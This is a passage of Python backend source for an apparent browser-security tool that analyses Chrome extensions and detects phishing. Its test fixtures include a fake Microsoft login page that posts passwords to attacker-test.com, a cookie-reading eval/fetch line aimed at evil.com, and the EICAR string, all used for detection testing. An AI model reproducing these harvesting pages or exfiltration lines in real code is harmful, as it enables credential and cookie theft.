def _store_c1_result(result: dict, source: str, webstore_url: str = "") -> dict:
    result["timestamp"]    = datetime.now().isoformat()
    result["source"]       = source
    result["webstore_url"] = webstore_url
    c1_history.insert(0, result)
    if len(c1_history) > 50:
        c1_history.pop()
    try:
        c1_db_save(result)
    except Exception as exc:
        print(f"[C1-DB] Save failed (non-fatal): {exc}")
    return result


@app.post("/extension/analyze")
async def extension_analyze(req: ExtensionAnalyzeReq):
    result = await analyze_extension_c1(
        req.manifest, req.source_code or "",
        req.extension_id or "", req.extension_path or "",
    )
    return _store_c1_result(result, "manual")


@app.post("/extension/upload")
async def extension_upload(file: UploadFile = File(...)):
    if not file.filename or not file.filename.lower().endswith(".crx"):
        raise HTTPException(status_code=400, detail="Only .crx files are accepted.")
    crx_data = await file.read()
    if len(crx_data) < 16:
        raise HTTPException(status_code=400, detail="File too small to be a valid CRX.")
    try:
        manifest_dict, source_code, ext_id = parse_crx_bytes(crx_data)
    except Exception as exc:
        raise HTTPException(status_code=422, detail=f"Could not parse CRX: {exc}")

    manifest_str = json.dumps(manifest_dict)
    ext_path = ""
    try:
        import io, zipfile
        from .c1.crx_utils import _crx_to_zip_bytes
        zip_bytes = _crx_to_zip_bytes(crx_data)
        tmp_dir = tempfile.mkdtemp(prefix="c1_upload_")
        with zipfile.ZipFile(io.BytesIO(zip_bytes)) as zf:
            zf.extractall(tmp_dir)
        ext_path = tmp_dir
    except Exception:
        pass

    result = await analyze_extension_c1(manifest_str, source_code, ext_id, ext_path,
                                        crx_sha256=sha256_of(crx_data), store_hint="Chrome")
    result["filename"] = file.filename
    return _store_c1_result(result, "upload")


@app.post("/extension/webstore")
async def extension_webstore(req: WebstoreLookupReq):
    raw = req.url_or_id.strip()
    ext_id = extract_ext_id_from_url(raw) or (raw.lower() if len(raw) == 32 else None)
    if not ext_id:
        raise HTTPException(status_code=400,
            detail="Provide a Chrome Web Store URL or a 32-character extension ID.")
    webstore_url = raw if is_webstore_url(raw) else \
        f"https://chromewebstore.google.com/detail/{ext_id}"
    try:
        crx_data = await fetch_crx_from_store(ext_id)
    except Exception as exc:
        raise HTTPException(status_code=502,
            detail=f"Could not download extension from Chrome Web Store: {exc}")
    try:
        manifest_dict, source_code, _ = parse_crx_bytes(crx_data, ext_id)
    except Exception as exc:
        raise HTTPException(status_code=422, detail=f"Could not parse downloaded CRX: {exc}")
    ext_path = ""
    try:
        ext_path = extract_crx_to_persistent_dir(crx_data, ext_id)
    except Exception:
        pass
    result = await analyze_extension_c1(json.dumps(manifest_dict), source_code, ext_id, ext_path,
                                        webstore_url=webstore_url, crx_sha256=sha256_of(crx_data),
                                        store_hint=store_from_url(webstore_url))
    result["webstore_url"] = webstore_url
    return _store_c1_result(result, "webstore", webstore_url)


@app.post("/extension/sandbox")
async def extension_sandbox(req: SandboxReq):
    return await sandbox_extension_c1(req.extension_path)


@app.get("/extension/sandbox/isolation")
async def sandbox_isolation():
    """Which containment backends this machine can provide, and which is active.

    The dashboard shows this so an analyst can see at a glance whether a
    dynamic verdict was produced inside a disposable VM or merely in a
    throwaway browser profile on the host — and, when the VM is unavailable,
    exactly what is missing.
    """
    from .c1.isolation import backend_status
    from .c1.sandbox import current_configuration
    status = await asyncio.to_thread(backend_status)
    configured = current_configuration()
    active = next((s["name"] for s in status if s["available"]), None)
    if configured["backend"] != "auto":
        forced = next((s for s in status if s["name"] == configured["backend"]), None)
        active = configured["backend"] if forced and forced["available"] else active
    return {
        "configured": configured,
        "active": active,
        "backends": status,
        "enable_hint": (
            "Enable-WindowsOptionalFeature -Online "
            "-FeatureName Containers-DisposableClientVM -All"
        ),
    }


# ── Blocklist evidence coverage ───────────────────────────────────────────────
# The finalized sheet merges a fully-evidenced source (malext_sentry) with an
# ID-only dump (chrome-mal-ids). These endpoints expose how much of it is
# actually documented, and let the analyst complete the rest — either one ID
# at a time or as a sweep — using the same ML + sandbox stack a live intercept
# would run.

@app.get("/extension/blocklist/stats")
async def blocklist_stats_endpoint():
    """Documented-vs-undocumented counts for the finalized blocklist sheet."""
    return await asyncio.to_thread(blocklist_coverage)


@app.get("/extension/blocklist/incomplete")
async def blocklist_incomplete(limit: int = 50):
    """IDs whose sheet row still has at least one undocumented field."""
    ids = await asyncio.to_thread(blocklist_incomplete_ids, limit)
    return {"count": len(ids), "ext_ids": ids}


@app.post("/extension/blocklist/reload")
async def blocklist_reload():
    """Re-read the sheet from disk — picks up an offline sweep's writes."""
    return await asyncio.to_thread(reload_blocklist)


@app.get("/extension/blocklist/{ext_id}")
async def blocklist_entry_endpoint(ext_id: str):
    """One blocklist row plus which of its fields are still undocumented."""
    probe = await asyncio.to_thread(blocklist_probe, ext_id)
    if not probe["match"]:
        raise HTTPException(status_code=404, detail="Extension ID is not on the blocklist.")
    return probe


@app.post("/extension/blocklist/document")
async def blocklist_document(req: BlocklistDocumentReq):
    """Download this extension, run the detection stack, and write the
    evidence it produces back into the finalized blocklist CSV."""
    result = await document_blocklist_entry(req.ext_id, run_sandbox_layer=req.sandbox)
    if result["status"] == "not_blocklisted":
        raise HTTPException(status_code=404, detail="Extension ID is not on the blocklist.")
    await _broadcast({"type": "c1_blocklist_documented", **{
        k: v for k, v in result.items() if k != "entry"
    }, "entry": result.get("entry")})
    return result


@app.post("/extension/blocklist/backfill")
async def blocklist_backfill(req: BlocklistBackfillReq):
    """Document a batch of under-reported rows in one pass.

    Runs in the background and streams progress over the dashboard WebSocket
    (`c1_blocklist_backfill`) — a full sweep is thousands of downloads, far
    longer than any HTTP request should hold open.
    """
    ids = await asyncio.to_thread(blocklist_incomplete_ids, max(0, req.limit))
    if not ids:
        return {"status": "nothing_to_do", "queued": 0}
    asyncio.create_task(_bg_blocklist_backfill(ids, req.sandbox, max(1, req.concurrency)))
    return {"status": "running", "queued": len(ids), "sandbox": req.sandbox}


async def _bg_blocklist_backfill(ext_ids: List[str], sandbox: bool, concurrency: int) -> None:
    """Walk a batch of undocumented IDs, documenting each one it can reach.

    Most undocumented IDs are undocumented *because* the store already pulled
    them, so "unavailable" is a normal outcome here, not a failure — it is
    counted separately and the row is left exactly as it was.
    """
    semaphore = asyncio.Semaphore(concurrency if not sandbox else 1)   # sandbox runs must not overlap
    tally = {"documented": 0, "no_change": 0, "unavailable": 0,
             "already_documented": 0, "not_blocklisted": 0}
    done = 0

    async def one(ext_id: str) -> None:
        nonlocal done
        async with semaphore:
            try:
                result = await document_blocklist_entry(ext_id, run_sandbox_layer=sandbox)
            except Exception as exc:
                print(f"[C1-BACKFILL] {ext_id} failed: {exc}")
                result = {"status": "unavailable", "ext_id": ext_id, "error": str(exc)}
            tally[result["status"]] = tally.get(result["status"], 0) + 1
            done += 1
            await _broadcast({
                "type": "c1_blocklist_backfill", "state": "progress",
                "ext_id": ext_id, "status": result["status"],
                "filled": result.get("filled", []),
                "reason": (result.get("entry") or {}).get("reason", ""),
                "done": done, "total": len(ext_ids), "tally": dict(tally),
            })

    await asyncio.gather(*(one(ext_id) for ext_id in ext_ids))
    print(f"[C1-BACKFILL] Finished {len(ext_ids)} IDs: {tally}")
    await _broadcast({"type": "c1_blocklist_backfill", "state": "done",
                      "total": len(ext_ids), "tally": tally,
                      "coverage": await asyncio.to_thread(blocklist_coverage)})


@app.get("/extension/history")
async def extension_history(limit: int = 20):
    try:
        return await asyncio.to_thread(c1_db_history, limit)
    except Exception:
        return c1_history[:limit]


@app.post("/session/install_extension")
async def session_install_extension(req: InstallExtensionReq):
    raw = req.url_or_id.strip()
    ext_id = extract_ext_id_from_url(raw) or (raw.lower() if len(raw) == 32 else None)
    if not ext_id:
        raise HTTPException(status_code=400,
            detail="Provide a Chrome Web Store URL or a 32-character extension ID.")
    try:
        crx_data = await fetch_crx_from_store(ext_id)
    except Exception as exc:
        raise HTTPException(status_code=502,
            detail=f"Could not download from Chrome Web Store: {exc}")
    try:
        manifest_dict, source_code, _ = parse_crx_bytes(crx_data, ext_id)
    except Exception as exc:
        raise HTTPException(status_code=422, detail=f"Could not parse CRX: {exc}")

    c1_result = await analyze_extension_c1(json.dumps(manifest_dict), source_code, ext_id,
                                           crx_sha256=sha256_of(crx_data), store_hint="Chrome")
    _store_c1_result(c1_result, "webstore_install")

    if c1_result["verdict"] == "MALICIOUS" and not req.force:
        return {"status": "blocked",
                "reason": "C1 flagged this extension as MALICIOUS — installation prevented.",
                "extension_id": ext_id, "c1_result": c1_result}

    try:
        ext_path = extract_crx_to_persistent_dir(crx_data, ext_id)
    except Exception as exc:
        raise HTTPException(status_code=500, detail=f"Extraction failed: {exc}")

    if pw_session.is_running:
        pw_session.register_extension(ext_path)
        await _broadcast({"type": "c1_extension_installed",
                           "extension_id": ext_id,
                           "extension_path": ext_path,
                           "c1_result": c1_result})
        return {"status": "installed", "extension_id": ext_id,
                "extension_path": ext_path, "c1_result": c1_result,
                "note": "Extension registered — will be active on next session start."}
    return {"status": "ready",
            "message": "Extension extracted. Start the browser session to load it.",
            "extension_id": ext_id, "extension_path": ext_path, "c1_result": c1_result}


@app.get("/session/extensions")
async def get_session_extensions():
    return {"extensions": pw_session.loaded_extensions,
            "count": len(pw_session.loaded_extensions)}


async def _on_extension_install_click(ext_id: str, webstore_url: str) -> None:
    if not ext_id:
        return
    print(f"[C1] 'Add to Chrome' clicked: {ext_id}")
    await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                      "url": webstore_url, "state": "analyzing"})
    try:
        crx_data = await fetch_crx_from_store(ext_id)
        manifest_dict, source_code, _ = parse_crx_bytes(crx_data, ext_id)
        ext_path = extract_crx_to_persistent_dir(crx_data, ext_id)
        manifest_str = json.dumps(manifest_dict)
        crx_hash = sha256_of(crx_data)
        store    = store_from_url(webstore_url)

        # Everything the analyzer needs to document a thinly-reported
        # blocklist row from this intercept rather than from the sheet.
        live_ctx = {"webstore_url": webstore_url, "crx_sha256": crx_hash, "store_hint": store}

        probe = blocklist_probe(ext_id)
        if probe["needs_evidence"]:
            # Known-bad ID, but the sheet has no evidence on record for it.
            # Run the full stack (ML + sandbox) to establish what it does,
            # instead of short-circuiting to a panel full of placeholders.
            print(f"[C1] {ext_id} is blocklisted with {len(probe['gaps'])} undocumented "
                  f"field(s) {probe['gaps']} — running ML + sandbox to establish evidence")
            await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                              "url": webstore_url, "state": "blocklist_evidence",
                              "gaps": probe["gaps"]})
            c1_result = await analyze_extension_c1(manifest_str, source_code, ext_id,
                                                  extension_path=ext_path, **live_ctx)
        else:
            static_result = await analyze_extension_c1(manifest_str, source_code, ext_id,
                                                       **live_ctx)
            static_score_pct = static_result["static"]["score"] * 100

            if static_score_pct >= 50.0:
                await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                                   "url": webstore_url, "state": "sandbox_running",
                                   "static_score": round(static_score_pct, 1)})
                c1_result = await analyze_extension_c1(manifest_str, source_code, ext_id,
                                                        extension_path=ext_path, **live_ctx)
            else:
                c1_result = static_result

        _store_c1_result(c1_result, "webstore_intercept", webstore_url)
        _pending_installs[ext_id] = {"c1_result": c1_result, "ext_path": ext_path,
                                      "webstore_url": webstore_url}

        state = {"SAFE": "safe", "SUSPICIOUS": "suspicious",
                 "MALICIOUS": "malicious"}.get(c1_result["verdict"], "suspicious")
        print(f"[C1] {ext_id} -> {c1_result['verdict']} (score={c1_result['score']:.3f})")
        await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                           "url": webstore_url, "state": state, "result": c1_result})
    except Exception as exc:
        print(f"[C1] Analysis FAILED for {ext_id}: {exc}")
        await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                           "url": webstore_url, "state": "error", "error": str(exc)})


@app.get("/websentinel-trigger")
async def websentinel_trigger_fallback(ext_id: str = "", url: str = ""):
    """
    Server-side fallback for the C1 'Add to Chrome' click hook.

    This URL is normally never actually requested over the network — the
    Playwright browser context intercepts it client-side via context.route()
    in playwright_session.py and serves the analyzing page + fires the click
    callback locally, without the request ever leaving the browser. This
    endpoint is a safety net for the rare case where that client-side
    interception is missed (e.g. a timing race between the pointerdown-
    triggered navigation and the click hook's own state), so the browser
    still gets a working analyzing page and the extension still gets
    analyzed and broadcast to the dashboard — instead of surfacing a bare
    404 to the user.
    """
    ext_id = ext_id.strip().lower()
    if ext_id:
        asyncio.create_task(_on_extension_install_click(ext_id, url))
    html = _ANALYZING_HTML.format(ext_id=ext_id or "unknown")
    if url:
        # Return the browser to the original page after the card has been
        # visible for a moment — mirrors PlaywrightSession._return_to_page's
        # behaviour on the normal client-side-intercepted path.
        html = html.replace(
            "</body>",
            f"<script>setTimeout(function(){{ window.location.replace({json.dumps(url)}); }}, 1500);</script></body>",
        )
    return HTMLResponse(html)


@app.post("/session/approve_install")
async def approve_install(req: ApproveInstallReq):
    pending = _pending_installs.get(req.ext_id)
    if not pending:
        raise HTTPException(status_code=404,
            detail="No pending install found for this extension ID.")
    verdict = pending["c1_result"].get("verdict", "SUSPICIOUS")
    if verdict != "SAFE":
        raise HTTPException(status_code=403,
            detail=f"Cannot approve — extension verdict is {verdict}.")
    ext_path     = pending["ext_path"]
    webstore_url = pending.get("webstore_url", "")
    del _pending_installs[req.ext_id]
    # Fire the restart in the background — return immediately so the dashboard
    # doesn't freeze during the ~5 s browser restart.
    asyncio.create_task(_bg_install_extension(req.ext_id, ext_path, webstore_url))
    return {"status": "installing", "ext_id": req.ext_id}


async def _bg_install_extension(ext_id: str, ext_path: str, webstore_url: str) -> None:
    try:
        await pw_session.load_extension(ext_path, restore_url=webstore_url)
        await _broadcast({"type": "c1_install_approved", "ext_id": ext_id,
                          "extension_path": ext_path, "webstore_url": webstore_url})
    except Exception as exc:
        print(f"[C1] Extension install failed for {ext_id}: {exc}")
        await _broadcast({"type": "c1_install_error", "ext_id": ext_id, "error": str(exc)})


@app.post("/session/block_install")
async def block_install(req: ApproveInstallReq):
    _pending_installs.pop(req.ext_id, None)
    await _broadcast({"type": "c1_install_blocked", "ext_id": req.ext_id})
    return {"status": "blocked", "ext_id": req.ext_id}


def _run_test_component(label: str, script: str) -> dict:
    """Run a test script as a subprocess and parse unittest -v output."""
    start = _time.time()
    try:
        proc = subprocess.run(
            [sys.executable, script, "-v"],
            capture_output=True, text=True, timeout=120,
            cwd=_REPO_ROOT, encoding="utf-8", errors="replace"
        )
        output = proc.stderr + "\n" + proc.stdout  # unittest writes to stderr
        elapsed = _time.time() - start

        tests = []
        # unittest -v format: "test_name (module.ClassName) ... ok"
        # Python 3.11+ adds the test method in the class name too
        for line in output.splitlines():
            m = _re.match(r"^(test\w+)\s+\(([^)]+)\)\s+\.\.\.\s+(ok|FAIL|ERROR|skipped.*)", line)
            if m:
                tname, tclass, tstatus = m.group(1), m.group(2).split(".")[-1], m.group(3)
                tests.append({"name": tname, "cls": tclass,
                               "status": "pass" if tstatus == "ok" else "skip" if tstatus.startswith("skipped") else "fail"})
            else:
                # C4 script format: "  PASS  description" or "  FAIL  description"
                m2 = _re.match(r"^\s+(PASS|FAIL)\s+(.+)", line)
                if m2:
                    tests.append({"name": m2.group(2).strip()[:80], "cls": "",
                                   "status": "pass" if m2.group(1) == "PASS" else "fail"})

        # Extract failure/error detail blocks
        fail_blocks: dict = {}
        current_key = None
        for line in output.splitlines():
            if line.startswith("FAIL: ") or line.startswith("ERROR: "):
                current_key = line.split(": ", 1)[1].split(" ")[0]
                fail_blocks[current_key] = []
            elif current_key and line.startswith("-" * 10):
                continue
            elif current_key:
                if line.startswith("=" * 10):
                    current_key = None
                else:
                    fail_blocks[current_key].append(line)

        # Attach error messages to tests
        for t in tests:
            if t["status"] == "fail":
                key = t["name"]
                if key in fail_blocks:
                    t["message"] = "\n".join(fail_blocks[key]).strip()

        passed = sum(1 for t in tests if t["status"] == "pass")
        failed = sum(1 for t in tests if t["status"] == "fail")

        # Fallback: if no tests parsed, check return code
        if not tests:
            # Try to parse summary line: "Ran X tests in Y.Ys"
            m_ran = _re.search(r"Ran (\d+) test", output)
            total = int(m_ran.group(1)) if m_ran else 0
            ok_m = _re.search(r"OK", output)
            passed = total if ok_m else 0
            failed = total - passed

        return {
            "label": label,
            "passed": passed,
            "failed": failed,
            "total": len(tests) if tests else (passed + failed),
            "duration": round(elapsed, 2),
            "tests": tests,
            "stdout": output[-3000:],  # last 3000 chars for debugging
            "returncode": proc.returncode,
        }
    except subprocess.TimeoutExpired:
        return {"label": label, "passed": 0, "failed": 0, "total": 0,
                "duration": 120, "tests": [], "stdout": "Timeout after 120s", "returncode": -1}
    except Exception as exc:
        return {"label": label, "passed": 0, "failed": 0, "total": 0,
                "duration": 0, "tests": [], "stdout": str(exc), "returncode": -1}


@app.post("/dev/run_tests")
async def run_tests(component: str = "all"):
    """Run unit test suites and return structured results.

    A component may map to more than one script — C1's blocklist evidence
    suite lives in its own file — in which case the runs are merged into a
    single result so the dashboard still shows one row per component.
    """
    _test = lambda *parts: os.path.join(_REPO_ROOT, "test", *parts)
    components_map = {
        "c1": ("C1 — Extension Analyzer",   [_test("C1", "test_c1_units.py"),
                                             _test("C1", "test_blocklist_evidence.py"),
                                             _test("C1", "test_isolation.py"),
                                             _test("C1", "test_report_ui.py")]),
        "c2": ("C2 — Phishing Detection",   [_test("C2", "test_c2_layers.py")]),
        "c3": ("C3 — Beacon Detector",      [_test("C3", "test_c3_units.py")]),
        "c4": ("C4 — Forensic Correlation", [_test("C4", "test_correlation.py")]),
    }
    targets = list(components_map.items()) if component == "all" else \
              [(component, components_map[component])] if component in components_map else []

    loop = asyncio.get_event_loop()
    results = []
    for cid, (label, scripts) in targets:
        merged = None
        for script in scripts:
            r = await loop.run_in_executor(None, _run_test_component, label, script)
            if merged is None:
                merged = r
                continue
            for key in ("passed", "failed", "total", "duration"):
                merged[key] += r[key]
            merged["tests"].extend(r["tests"])
            merged["stdout"] += "\n" + r["stdout"]
            merged["returncode"] = merged["returncode"] or r["returncode"]
        merged["duration"] = round(merged["duration"], 2)
        merged["id"] = cid
        results.append(merged)

    total_passed = sum(r["passed"] for r in results)
    total_failed = sum(r["failed"] for r in results)
    total_duration = sum(r["duration"] for r in results)
    return {
        "components": results,
        "total_passed": total_passed,
        "total_failed": total_failed,
        "total_duration": round(total_duration, 2),
    }


_TEST_PAGES: dict = {
    "c2-phish": """<!DOCTYPE html><html><head><title>Secure Login - Microsoft</title></head><body>
<iframe style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99999;border:none;"
        src="https://login.evil-test.com/oauth"></iframe>
<form action="https://attacker-test.com/steal" method="POST">
  <input type="password" name="pass" placeholder="Password"/>
  <input type="hidden" name="token" value="abc123"/>
</form>
<script src="https://cdn.evil-test.com/tracker.js"></script>
<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
            background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 32px rgba(0,0,0,.3);
            font-family:Segoe UI,sans-serif;text-align:center;z-index:99998">
  <h2 style="color:#0078d4">Sign in to Microsoft</h2>
  <input type="email" placeholder="Email" style="display:block;width:280px;padding:8px;margin:12px auto;border:1px solid #ccc;border-radius:4px"/>
  <input type="password" placeholder="Password" style="display:block;width:280px;padding:8px;margin:12px auto;border:1px solid #ccc;border-radius:4px"/>
  <button style="background:#0078d4;color:#fff;border:none;padding:10px 24px;border-radius:4px;cursor:pointer">Next</button>
  <p style="font-size:11px;color:#888;margin-top:12px">WebSentinel C2 Phishing Test Page</p>
</div>
</body></html>""",

    "c2-clean": """<!DOCTYPE html><html><head><title>My Blog</title></head><body>
<h1>Welcome to My Blog</h1><p>This is a perfectly safe page with no phishing indicators.</p>
<article><h2>Article Title</h2><p>Some content here.</p></article>
<footer><p>Copyright 2024 My Blog</p></footer>
</body></html>""",
}

# Realistic C2 test pages live on disk in test/C2/pages/ (built from the real mrd0x
# BitB kits + hand-crafted scenario pages — see test/C2/build_pages.py). Load them
# into _TEST_PAGES so /dev/test-page/<name> can serve them to the live browser.
_TEST_PAGES_DIR = os.path.join(_REPO_ROOT, "test", "C2", "pages")
if os.path.isdir(_TEST_PAGES_DIR):
    for _fname in os.listdir(_TEST_PAGES_DIR):
        if _fname.endswith(".html"):
            _key = "c2-" + _fname[:-5].replace("_", "-")
            try:
                with open(os.path.join(_TEST_PAGES_DIR, _fname), encoding="utf-8") as _fh:
                    _TEST_PAGES[_key] = _fh.read()
            except OSError:
                pass

@app.get("/dev/test-page/{name}")
async def serve_test_page(name: str):
    html = _TEST_PAGES.get(name)
    if not html:
        return HTMLResponse("<html><body>Test page not found</body></html>", status_code=404)
    return HTMLResponse(html)


# The official EICAR anti-malware test string — a 68-byte ASCII signature every
# AV engine on earth recognizes as "found: EICAR-Test-File". It contains no
# executable logic and is completely harmless; it exists specifically so
# security tools can be tested without using real malware. See eicar.org.
# Served locally (rather than fetched from eicar.org's own secure.eicar.org
# host) because that host's payload endpoint resets the connection from this
# environment's network path before the response completes — likely network-
# level content inspection intercepting the known signature in transit. The
# bytes here are byte-for-byte identical to the official file either way.
EICAR_TEST_STRING = rb'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
EICAR_SHA256 = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"


@app.get("/dev/test-file/eicar")
async def serve_eicar_testfile():
    return Response(
        EICAR_TEST_STRING,
        media_type="application/octet-stream",
        headers={"Content-Disposition": 'attachment; filename="eicar.com"'},
    )


# ── Inline test cases ─────────────────────────────────────────────────────────

async def _tc_c1_benign_manifest():
    from .c1.features import extract_manifest_features
    manifest = {"name": "Simple", "version": "1.0", "manifest_version": 3, "permissions": ["storage"]}
    feats = extract_manifest_features(manifest, "")
    assert feats["has_webRequest"] == 0.0, "has_webRequest should be 0"
    assert feats["has_all_urls"] == 0.0, "has_all_urls should be 0"
    assert feats["total_permission_count"] == 1.0, "total_permission_count should be 1"
    return {"detail": "storage-only manifest → all high-risk features = 0"}

async def _tc_c1_malicious_manifest():
    from .c1.features import extract_manifest_features
    manifest = {
        "name": "Evil", "version": "1.0", "manifest_version": 3,
        "permissions": ["webRequest", "cookies", "tabs", "nativeMessaging"],
        "host_permissions": ["<all_urls>"],
        "background": {"service_worker": "bg.js"},
        "content_scripts": [{"matches": ["<all_urls>"], "js": ["inject.js"]}],
    }
    feats = extract_manifest_features(manifest, "")
    assert feats["has_webRequest"] == 1.0
    assert feats["has_all_urls"] == 1.0
    assert feats["has_nativeMessaging"] == 1.0
    assert feats["has_background_script"] == 1.0
    return {"detail": f"malicious manifest → 4 high-risk flags confirmed"}

async def _tc_c1_code_eval_detection():
    from .c1.features import extract_manifest_features
    manifest = {"name": "T", "version": "1", "manifest_version": 3, "permissions": []}
    code = "eval(atob('aGVsbG8=')); document.cookie; fetch('https://evil.com/c2');"
    feats = extract_manifest_features(manifest, code)
    assert feats["eval_count"] > 0, "eval not detected"
    assert feats["atob_count"] > 0, "atob not detected"
    assert feats["cookie_in_code"] > 0, "cookie access not detected"
    assert feats["xhr_fetch_count"] > 0, "fetch not detected"
    return {"detail": f"eval={feats['eval_count']}, atob={feats['atob_count']}, cookie={feats['cookie_in_code']}, fetch={feats['xhr_fetch_count']}"}

async def _tc_c1_entropy():
    from .c1.features import _shannon_entropy
    clean = _shannon_entropy("console.log('hello world');")
    obf = _shannon_entropy("var _0x1a=['\\x68\\x65\\x6c\\x6c\\x6f'];eval(atob('aGVsbG8='));_0x1a[0x0];")
    assert clean >= 0.0
    assert obf > 0.0
    return {"detail": f"clean={clean:.2f} bits, obfuscated={obf:.2f} bits"}

async def _tc_c2_url_phishing():
    await _step("Layer 2 is the URL classifier. First: a classic phishing URL — 'paypal' bait "
                "with a hyphen, on free hosting (yolasite.com)…")
    score_data = await check_url("http://paypal-secure-login.yolasite.com/update")
    assert score_data["score"] > 0.0, f"Phishing URL scored 0: {score_data}"
    await _step(f"The URL model scored it {score_data['score']:.3f} — brand name + hyphen + "
                f"free host are strong phishing signals")
    return {"detail": f"paypal-secure-login.yolasite.com → score={score_data['score']:.3f}"}

async def _tc_c2_url_benign():
    await _step("Same URL layer, now on a normal URL (google.com search) — it must stay low "
                "to avoid false positives…")
    score_data = await check_url("https://www.google.com/search?q=python")
    assert score_data["score"] < 0.8, f"Benign URL scored too high: {score_data['score']}"
    await _step(f"google.com scored {score_data['score']:.3f} — well below the flagging "
                f"threshold, no false positive")
    return {"detail": f"google.com → score={score_data['score']:.3f} (below 0.80 threshold)"}

async def _tc_c2_verified_domain():
    """Verified-domain trust gate: a Tranco-listed site is VERIFIED (no false positive),
    while a phishing page on a free-hosting subdomain is NOT trusted."""
    await _step("The trust gate: 50,000 verified domains (Tranco list) skip heuristic scanning "
                "entirely. Even if google.com served markup that trips the DOM heuristics…")
    # google.com served with markup that normally trips L1 heuristics.
    noisy_dom = ('<html><body style="position:fixed;user-select:none">'
                 '<div style="z-index:99999"></div></body></html>')
    g = await analyze(AnalyzeReq(url="https://www.google.com/search?q=python", dom=noisy_dom))
    assert g["verdict"] == "VERIFIED", f"google.com expected VERIFIED, got {g['verdict']} ({g['risk_score']})"
    assert g["risk_score"] == 0.0, f"google.com risk should be 0, got {g['risk_score']}"
    await _step("google.com → VERIFIED with risk 0 despite the noisy markup. But a phishing "
                "page on a free-hosting subdomain must NOT inherit trust…")
    # Free-host subdomain must bypass verification and be scanned normally.
    y = await analyze(AnalyzeReq(url="http://paypal-login.yolasite.com/x",
                                 dom='<html><body><form action="http://evil.tld/x">'
                                     '<input type=password></form></body></html>'))
    assert y["verdict"] != "VERIFIED", f"yolasite subdomain wrongly VERIFIED ({y['risk_score']})"
    await _step(f"paypal-login.yolasite.com bypassed the gate and was scanned → "
                f"{y['verdict']} (risk {y['risk_score']})")
    return {"detail": f"google.com → VERIFIED (risk 0); paypal-login.yolasite.com → {y['verdict']} (risk {y['risk_score']})"}

async def _tc_c2_form_offsite():
    await _step("Layer 4 watches where forms SEND data. Here a password form on a bank page "
                "POSTs to attacker.com — credential harvesting…")
    dom = """<html><body><form action="https://attacker.com/steal" method="POST">
    <input type="password" name="pass"/></form></body></html>"""
    res = await check_form("https://legitimate-bank.com/login", dom)
    assert res["score"] > 0.5, f"Off-domain form scored {res['score']}"
    await _step(f"Off-domain password POST flagged: L4={res['score']:.2f}")
    return {"detail": f"form→attacker.com from legitimate-bank.com → score={res['score']:.2f}"}

async def _tc_c2_form_samedomain():
    await _step("The flip side: a password form POSTing to its OWN site (mybank.com → /submit) "
                "is normal behaviour and must score zero…")
    dom = """<html><body><form action="/submit" method="POST">
    <input type="password" name="pass"/></form></body></html>"""
    res = await check_form("https://mybank.com/login", dom)
    assert res["score"] == 0.0, f"Same-domain form scored {res['score']} (expected 0)"
    await _step("Same-origin form scored 0.00 — everyday logins stay unflagged")
    return {"detail": f"form→/submit from mybank.com → score=0.00 (safe)"}

async def _tc_c2_browser_phish():
    """Navigate Playwright browser to phishing test page and analyze live."""
    test_url = "http://127.0.0.1:8765/dev/test-page/c2-phish"
    phish_html = _TEST_PAGES["c2-phish"]
    await _step("Opening a synthetic BitB attack page in the live browser — a fake overlay "
                "window with a fake address bar covering the whole viewport…")
    # Navigate browser to the test page (visual demonstration)
    await _ensure_browser_running()
    try:
        await pw_session.navigate(test_url)
        await _step("Attack page rendered — the 'browser window' you see is drawn by the "
                    "page itself. Scoring it with the DOM/URL/form layers…")
    except Exception:
        pass
    # Run C2 analysis on the phishing HTML directly
    res = await check_bitb(test_url, phish_html)
    assert res["score"] > 0.3, f"Phishing page scored too low: {res['score']}"
    url_res = await check_url(test_url)
    form_res = await check_form(test_url, phish_html)
    rep_res  = await check_reputation(test_url, settings.get("gsb_key", ""))
    combined = round(min(1.0, res["score"] * 0.35 + url_res["score"] * 0.30 + form_res["score"] * 0.20 + rep_res["score"] * 0.15), 3)
    await _step(f"Layers fired: BitB DOM={res['score']:.2f}, URL={url_res['score']:.2f}, "
                f"Form={form_res['score']:.2f} → combined {combined:.2f}")
    return {
        "detail": f"BitB={res['score']:.2f} URL={url_res['score']:.2f} Form={form_res['score']:.2f} → combined={combined:.2f}",
        "browser_url": test_url,
    }

async def _tc_c2_browser_clean():
    """Navigate Playwright browser to clean test page and verify low score."""
    test_url = "http://127.0.0.1:8765/dev/test-page/c2-clean"
    clean_html = _TEST_PAGES["c2-clean"]
    await _step("Opening a normal blog page in the live browser — the detector must stay "
                "quiet on everyday pages…")
    await _ensure_browser_running()
    try:
        await pw_session.navigate(test_url)
        await _step("Blog page rendered — no overlays, no fake chrome. Scoring it…")
    except Exception:
        pass
    res = await check_bitb(test_url, clean_html)
    assert res["score"] < 0.8, f"Clean page scored too high: {res['score']}"
    await _step(f"Clean page scored {res['score']:.2f} — below the flagging threshold, no "
                f"false positive")
    return {
        "detail": f"Clean blog page → BitB score={res['score']:.2f} (below 0.80 threshold)",
        "browser_url": test_url,
    }

# ── C2 realistic scenario tests ──────────────────────────────────────────────
# Page assets: test/C2/pages/ (real mrd0x BitB kits via build_pages.py + scenario
# pages), served to the live browser through /dev/test-page/<name>.

_C2_TESTPAGE_BASE = "http://127.0.0.1:8765/dev/test-page"
_C2_MS_LOOKALIKE  = "https://login.microsoft.com.evil-phish.xyz/oauth2/v2.0/authorize"


def _c2_page(name: str) -> str:
    key = f"c2-{name}"
    assert key in _TEST_PAGES, f"test page '{key}' missing — run: python test/C2/build_pages.py"
    return _TEST_PAGES[key]


def _layer(result: dict, lid: str) -> dict:
    return next((l for l in result.get("layers", []) if l["id"] == lid), {})


async def _tc_c2_kit_windows():
    """Real mrd0x BitB kit (Windows Chrome template) rendered in the live browser,
    analyzed through the full pipeline as if hosted on a Microsoft lookalike domain."""
    await _ensure_browser_running()
